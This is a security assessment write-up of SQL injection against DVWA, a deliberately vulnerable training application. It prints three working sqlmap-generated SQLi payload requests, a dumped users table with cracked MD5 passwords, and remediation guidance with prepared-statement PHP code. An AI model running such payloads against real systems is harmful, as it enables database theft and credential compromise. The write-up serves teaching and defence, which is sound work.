# DVWA - SQL injection (sqlmap)

## Summary

During a scheduled security assessment, a high-severity SQL Injection (SQLi) vulnerability was confirmed in the Damn Vulnerable Web Application (DVWA). The vulnerability was identified and successfully exploited using `sqlmap`, targeting the SQL injection module.

*   **Vulnerability Type:** SQL Injection (SQLi)
*   **Target Parameter:** `id` (GET parameter)
*   **Confirmed Injection Techniques:**
    *   **Boolean-based blind:** `OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)`
    *   **Error-based:** `MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)`
    *   **UNION query:** `MySQL UNION query (NULL) - 2 columns`
*   **Back-End DBMS:** MySQL / MariaDB (reported banner version: `10.1.26-MariaDB-0+deb9u1`)
*   **Database User:** `app@localhost`
*   **Current Database:** `dvwa`
*   **Severity Rating:** **Critical**
*   **Severity Justification:** This vulnerability represents a complete breakdown of data confidentiality and integrity. Exploitation allows arbitrary reading of database contents. In this instance, a full database dump was achieved, exposing the sensitive `users` table containing administrative credentials and weak cryptographic hashes. Under certain configurations, SQL injection can also be leveraged to write files, execute remote OS commands, or move laterally within the hosting environment.

---

## Evidence

### Injectable Parameter & Payloads
The GET parameter `id` on the vulnerable endpoint was identified as highly vulnerable. `sqlmap` generated and verified the following payloads for each technique:

*   **Boolean-based blind:**
    ```http
    GET http://target-w/vulnerabilities/sqli/?id=1' OR NOT 2777=2777#&Submit=Submit
    ```
*   **Error-based (EXTRACTVALUE):**
    ```http
    GET http://target-w/vulnerabilities/sqli/?id=1' AND EXTRACTVALUE(3111,CONCAT(0x5c,0x7162627071,(SELECT (ELT(3111=3111,1))),0x717a707871))-- SCcR&Submit=Submit
    ```
*   **UNION query (2 Columns):**
    ```http
    GET http://target-w/vulnerabilities/sqli/?id=1' UNION ALL SELECT CONCAT(0x7162627071,0x4e5a74666f4f447670454851784b57644446536b686a57746c41796b4964526a514c634c65666672,0x717a707871),NULL#&Submit=Submit
    ```

### Enumerated Databases
The following databases were discovered on the database server:
*   `dvwa`
*   `information_schema`

### Dumped Users Table (`dvwa.users`)
By exploiting the injection point, the entire contents of the `users` table were exfiltrated:

| user_id | user | avatar | password | last_name | first_name | last_login | failed_login |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 1 | admin | `/hackable/users/admin.jpg` | `5f4dcc3b5aa765d61d8327deb882cf99` | admin | admin | 2026-09-06 11:18:29 | 0 |
| 2 | gordonb | `/hackable/users/gordonb.jpg` | `e99a18c428cb38d5f260853678922e03` | Brown | Gordon | 2026-09-06 11:18:29 | 0 |
| 3 | 1337 | `/hackable/users/1337.jpg` | `8d3533d75ae2c3966d7e0d4fcc69216b` | Me | Hack | 2026-09-06 11:18:29 | 0 |
| 4 | pablo | `/hackable/users/pablo.jpg` | `0d107d09f5bbe40cade3de5c71e9e9b7` | Picasso | Pablo | 2026-09-06 11:18:29 | 0 |
| 5 | smithy | `/hackable/users/smithy.jpg` | `5f4dcc3b5aa765d61d8327deb882cf99` | Smith | Bob | 2026-09-06 11:18:29 | 0 |

> **Security Note:** The retrieved password hashes use the outdated and cryptographically broken MD5 algorithm. They do not utilize salts, making them highly vulnerable to rapid offline dictionary-based and brute-force attacks. 
> *   `5f4dcc3b5aa765d61d8327deb882cf99` reverses to plaintext: `password` (used by `admin` and `smithy`)
> *   `e99a18c428cb38d5f260853678922e03` reverses to plaintext: `abc123` (used by `gordonb`)

---

## Root Cause

The root cause of this vulnerability is the direct interpolation/concatenation of unsanitized user input into a SQL query string. The application processes the user-supplied `id` parameters directly within SQL commands, allowing an attacker to inject syntax-altering characters (such as `'`, `OR`, `UNION`, and comment characters `#` or `--`) to restructure the query and execute arbitrary logic.

---

## Remediation

To secure the application against SQL injection, the following remediation plan must be implemented.

### 1. Primary Fix: Parameterized Queries (Prepared Statements)
All user-supplied values must be bound to the SQL statement separately from the command structure using prepared statements. This separates SQL code from data, neutralizing any injected SQL payloads.

Below is a secure, refactored implementation of the query using PHP Data Objects (PDO):

```php
<?php
// Establish a secure PDO connection
try {
    $dsn = "mysql:host=localhost;dbname=dvwa;charset=utf8mb4";
    $username = "app";
    $password = "your_secure_password";
    
    $options = [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION, // Throw exceptions on errors
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,       // Retrieve results as associative arrays
        PDO::ATTR_EMULATE_PREPARES   => false,                  // Disable emulation to enforce native prepared statements
    ];
    
    $pdo = new PDO($dsn, $username, $password, $options);
} catch (\PDOException $e) {
    // Hide native connection errors from end users
    error_log("Connection failed: " . $e->getMessage());
    die("A system error occurred. Please try again later.");
}

// 1. Input Validation & Strict Type Casting (Defense-in-depth)
if (!isset($_GET['id']) || !is_numeric($_GET['id'])) {
    die("Invalid input provided.");
}
$userId = (int)$_GET['id'];

try {
    // 2. Prepared Statement Construction
    // The placeholder :id is used instead of direct concatenation
    $query = "SELECT first_name, last_name FROM users WHERE user_id = :id";
    $stmt = $pdo->prepare($query);
    
    // 3. Bind value and execute
    $stmt->execute(['id' => $userId]);
    $user = $stmt->fetch();
    
    if ($user) {
        echo "User found: " . htmlspecialchars($user['first_name']) . " " . htmlspecialchars($user['last_name']);
    } else {
        echo "No user matching that ID exists.";
    }
} catch (\PDOException $e) {
    // Log details privately; display generic errors to users
    error_log("Query execution failed: " . $e->getMessage());
    die("An unexpected error occurred while processing your request.");
}
?>
```

### 2. Defense in Depth

*   **Strict Input Validation & Casting:**
    As demonstrated above, force type constraints on parameters when possible. For example, if an ID must be an integer, reject non-numeric characters outright or explicitly cast the incoming value using `(int)$_GET['id']` prior to processing.
*   **Database Account Principle of Least Privilege:**
    The database user was identified as `app@localhost`. This account should be restricted to the lowest privilege levels required for application functionality.
    *   Revoke administrative privileges (e.g., `SUPER`, `GRANT OPTION`).
    *   Ensure the database account does not have file-system access (revoke `FILE` privilege) to block hackers from reading/writing local server files via statements like `SELECT ... INTO OUTFILE`.
*   **Implement Secure Cryptographic Password Hashing:**
    Unsalted MD5 hashes provide zero protection. The storage of password hashes must be migrated to a strong, slow-by-design hashing algorithm like `bcrypt` or `Argon2id` using native PHP functions:
    ```php
    // To Hash a password:
    $hash = password_hash($plaintextPassword, PASSWORD_ARGON2ID);

    // To Verify a password during authentication:
    if (password_verify($submittedPassword, $hash)) {
        // Password is valid
    }
    ```
*   **Generic Error Handling Configuration:**
    Ensure database and application errors are not displayed to end-users (leakage of technical stack, MySQL banners, and SQL structures helps attackers construct payloads). Update `php.ini` configurations on production servers:
    ```ini
    display_errors = Off
    log_errors = On
    ```
*   **Web Application Firewall (WAF):**
    Deploy a Web Application Firewall (e.g., ModSecurity, AWS WAF, or Cloudflare) configured with signature-based detection rules (such as OWASP Core Rule Set) to detect, log, and block classic SQL injection syntax patterns before they reach the backend application.
